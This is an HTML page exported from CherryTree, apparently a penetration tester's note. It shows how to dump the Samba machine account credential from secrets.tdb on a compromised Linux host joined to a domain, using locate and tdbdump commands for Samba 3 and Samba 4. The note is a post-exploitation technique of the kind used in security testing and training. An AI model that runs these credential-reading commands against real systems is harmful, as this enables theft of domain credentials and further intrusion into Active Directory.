<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Samba dump credentials</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Samba dump credentials</h1><br/> if the compromised <span style="text-decoration:underline;">Linux box is running SAMBA and is joined to a Windows Domain</span>, you may want find a way to extract the “machine account” (also known as Machine Trust Account) that is used to authenticate a client host to the Domain Controller.<br /> If we manage to find the password for the machine account, then we will have an unprivileged user that can be used to go a step further in the domain compromise. This user account will provide us with access to the Domain Controller via LDAP to obtain valuable information as well as to access, at least, the SYSVOL share<br /> <br />When a new Samba user is created, this information is usually stored in what is known as the “<code>secrets.tdb</code>” file. For more check this article <a href="https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9">https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9</a><br /><br /><br />SAMBA 3:<br /><div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ updatedb<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">locate</span> secrets.tdb<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ tdbdump <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>samba<span style="color:#ff9d00;font-weight:700">/</span>secrets.tdb</pre></div><br />    We need to decode the data field that is been encoded in utf-8<br />    <a href=""><img src="images/1462-1.png" alt="images/1462-1.png" /></a><br /><br />SAMBA 4:<br /><div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ updatedb<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">locate</span> secrets.tdb<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ tdbdump <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>samba<span style="color:#ff9d00;font-weight:700">/</span>private<span style="color:#ff9d00;font-weight:700">/</span>secrets.tdb</pre></div><br />    We need to decode the data field that is been encoded in utf-8<br />    <a href=""><img src="images/1462-2.png" alt="images/1462-2.png" /></a><br />        <br /><br />Bibliography:<br />• <a href="https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9">https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9</a></div>
</body>
</html>
